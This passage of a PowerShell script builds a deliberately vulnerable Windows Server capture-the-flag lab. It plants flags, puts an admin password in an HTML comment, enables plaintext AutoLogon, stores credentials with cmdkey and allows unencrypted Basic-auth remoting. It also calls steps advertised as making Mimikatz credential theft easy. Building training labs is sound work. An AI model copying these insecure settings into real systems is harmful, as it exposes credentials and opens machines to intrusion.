    $regFlag3 = New-CTFFlag -Location "Registry Service" -Description "Service ImagePath" -Points 35 -Difficulty "Hard" -Technique "Service registry analysis"
    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnScanner" -Name "Flag" -Value $regFlag3 -Force
    
    Write-Host "  Registry flags created" -ForegroundColor Green
}

# Function to create web application flags
function Create-VulnerableWebApps {
    Write-Host "Creating vulnerable web applications with flags..." -ForegroundColor Yellow
    
    # Install IIS
    Enable-WindowsOptionalFeature -Online -FeatureName IIS-WebServerRole, IIS-WebServer, IIS-CommonHttpFeatures, IIS-HttpErrors, IIS-HttpRedirect, IIS-ApplicationDevelopment, IIS-HealthAndDiagnostics, IIS-HttpLogging, IIS-Security, IIS-RequestFiltering, IIS-Performance, IIS-WebServerManagementTools, IIS-ManagementConsole, IIS-IIS6ManagementCompatibility, IIS-Metabase -All -NoRestart
    
    # Create vulnerable web app
    New-Item -Path "C:\inetpub\wwwroot\vulnapp" -ItemType Directory -Force
    
    # Web flag in HTML comment
    $webFlag1 = New-CTFFlag -Location "Web HTML Comment" -Description "Login page HTML comment" -Points 10 -Difficulty "Easy" -Technique "Web source review"
    
    $vulnPage = @"
<html>
<head><title>Vulnerable App</title></head>
<body>
<h1>Admin Panel</h1>
<!-- TODO: Remove debug info before production -->
<!-- Admin password: $LabPassword -->
<!-- $webFlag1 -->
<form method="GET">
    Username: <input type="text" name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Login">
</form>
</body>
</html>
"@
    $vulnPage | Out-File "C:\inetpub\wwwroot\vulnapp\login.html"
    
    # Enable directory browsing
    Set-WebConfigurationProperty -Filter "/system.webServer/directoryBrowse" -Name "enabled" -Value $true -PSPath "IIS:\Sites\Default Web Site"
    
    Write-Host "  Web applications created with flags" -ForegroundColor Green
}

# Function to enable legacy protocols
function Enable-LegacyProtocols {
    Write-Host "Enabling legacy protocols..." -ForegroundColor Yellow
    
    # Enable LLMNR
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -Value 1 -ErrorAction SilentlyContinue
    
    # Enable NetBIOS
    $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=true"
    foreach ($adapter in $adapters) {
        $adapter.SetTcpipNetbios(1) | Out-Null
    }
    
    Write-Host "  Legacy protocols enabled" -ForegroundColor Green
}

# Function to generate flag documentation
function Generate-FlagReport {
    Write-Host "`nGenerating flag report..." -ForegroundColor Cyan
    
    $reportPath = "C:\CTF_FLAGS_SERVER_v5_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
    
    $html = @"
<!DOCTYPE html>
<html>
<head>
    <title>CTF Flag Report - Server v5 - $(hostname)</title>
    <style>
        body { font-family: Arial; margin: 20px; background: #f0f0f0; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
        h1 { color: #333; border-bottom: 3px solid #007acc; padding-bottom: 10px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th { background: #007acc; color: white; padding: 12px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #ddd; }
        tr:hover { background: #f5f5f5; }
        .easy { color: green; font-weight: bold; }
        .medium { color: orange; font-weight: bold; }
        .hard { color: red; font-weight: bold; }
        .stats { background: #e7f4ff; padding: 15px; border-radius: 5px; margin: 20px 0; }
        .flag-code { font-family: 'Courier New'; background: #f0f0f0; padding: 2px 5px; border-radius: 3px; }
        .pokemon-theme { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .new-vulns { background: #d4edda; border-left: 5px solid #28a745; padding: 10px; margin: 20px 0; }
        .mimikatz { background: #fff3cd; border-left: 5px solid #ffc107; padding: 10px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="pokemon-theme">
            <h1 style="color: white; border: none;">CTF Flag Report v5 - Windows Server 2019 </h1>
        </div>
        <div class="stats">
            <h2>Statistics</h2>
            <p><strong>Total Flags:</strong> $($global:FlagList.Count)</p>
            <p><strong>Easy Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Easy'}).Count)</p>
            <p><strong>Medium Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Medium'}).Count)</p>
            <p><strong>Hard Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Hard'}).Count)</p>
            <p><strong>Report Generated:</strong> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</p>
        </div>
        
        <h2>Flag Details</h2>
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Flag</th>
                    <th>Location</th>
                    <th>Description</th>
                    <th>Difficulty</th>
                    <th>Technique</th>
                </tr>
            </thead>
            <tbody>
"@
    
    foreach ($flag in $global:FlagList | Sort-Object FlagID) {
        $difficultyClass = $flag.Difficulty.ToLower()
        $html += @"
                <tr>
                    <td>$($flag.FlagID)</td>
                    <td class="flag-code">$($flag.Flag)</td>
                    <td>$($flag.Location)</td>
                    <td>$($flag.Description)</td>
                    <td class="$difficultyClass">$($flag.Difficulty)</td>
                    <td>$($flag.Technique)</td>
                </tr>
"@
    }
    
    $html += @"
            </tbody>
        </table>
    </div>
</body>
</html>
"@
    
    $html | Out-File $reportPath -Encoding UTF8
    
    # Also create a CSV for easier parsing
    $csvPath = $reportPath -replace '\.html$', '.csv'
    $global:FlagList | Export-Csv -Path $csvPath -NoTypeInformation
    
    # Create a simple text file with just the flags
    $flagsOnlyPath = $reportPath -replace '\.html$', '_flags_only.txt'
    $global:FlagList | ForEach-Object { $_.Flag } | Out-File $flagsOnlyPath -Encoding UTF8
    
    Write-Host "  Flag report saved to: $reportPath" -ForegroundColor Green
    Write-Host "  CSV report saved to: $csvPath" -ForegroundColor Green
    Write-Host "  Flags only file saved to: $flagsOnlyPath" -ForegroundColor Green
    
    return $reportPath
}

# Main execution
Write-Host "`nStarting vulnerable server configuration v5 ..." -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan

# Run all configurations
Create-WeakUsers
Disable-SecurityFeatures
Configure-MimikatzVulnerabilities
Configure-DebugPrivileges
Configure-PassTheHash
Configure-VulnerableRDP
Configure-VulnerableSMB
Create-UnquotedServicePaths
Configure-AlwaysInstallElevated
Configure-PrintSpoolerVulnerabilities
Configure-VulnerableSSH
Create-VulnerableServices
Create-VulnerableScheduledTasks
Create-RegistryFlags
Create-VulnerableWebApps
Enable-LegacyProtocols

# Additional misconfigurations
Write-Host "`nApplying additional misconfigurations..." -ForegroundColor Yellow

# AutoLogon
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -Value "overclock"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Value "Administrator2025!"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -Value 1

# Store credentials
cmdkey /add:DC01 /user:Administrator /pass:$LabPassword
cmdkey /add:FileServer /user:overclock /pass:Administrator2025!

# Enable PowerShell remoting without authentication
Enable-PSRemoting -Force -SkipNetworkProfileCheck
Set-Item WSMan:\localhost\Service\Auth\Basic -Value $true -ErrorAction SilentlyContinue
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true -ErrorAction SilentlyContinue

# Generate reports if requested
if ($GenerateFlagReport) {
    $reportPath = Generate-FlagReport
}

Write-Host "`n========================================" -ForegroundColor Green
Write-Host "Server vulnerability configuration v5 complete!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "MIMIKATZ-FRIENDLY FEATURES:" -ForegroundColor Cyan
Write-Host "  WDigest enabled (plaintext passwords in memory)" -ForegroundColor Yellow
Write-Host "  LSA Protection disabled" -ForegroundColor Yellow
Write-Host "  Debug privileges granted to users" -ForegroundColor Yellow
Write-Host "  Pass-the-Hash enabled (NTLM)" -ForegroundColor Yellow
Write-Host "  Credential Guard disabled" -ForegroundColor Yellow
Write-Host ""
Write-Host "OTHER VULNERABILITIES:" -ForegroundColor Cyan
Write-Host "  Unquoted Service Paths (3 services)" -ForegroundColor Yellow
Write-Host "  AlwaysInstallElevated MSI" -ForegroundColor Yellow
Write-Host "  Print Spooler (PrintNightmare)" -ForegroundColor Yellow
Write-Host ""
Write-Host "FLAG STATISTICS:" -ForegroundColor Cyan
Write-Host "  Total Flags Placed: $($global:FlagList.Count)" -ForegroundColor Yellow
Write-Host ""
Write-Host "Users for Mimikatz testing:" -ForegroundColor Cyan
Write-Host "  Administrator: $LabPassword" -ForegroundColor Yellow
Write-Host "  overclock: Administrator2025!" -ForegroundColor Yellow
Write-Host "  backup: Backupaccount123!" -ForegroundColor Yellow
Write-Host "  debugger: Debugger2025! (has debug privs)" -ForegroundColor Yellow
Write-Host ""
if ($GenerateFlagReport) {
    Write-Host "Flag reports generated!" -ForegroundColor Green
}
Write-Host ""
Write-Host "REMINDER: This server is now EXTREMELY VULNERABLE!" -ForegroundColor Red
Write-Host "Optimized for Mimikatz credential extraction!" -ForegroundColor Red
Write-Host ""
Write-Host "Please restart the server to ensure all changes take effect." -ForegroundColor Cyan
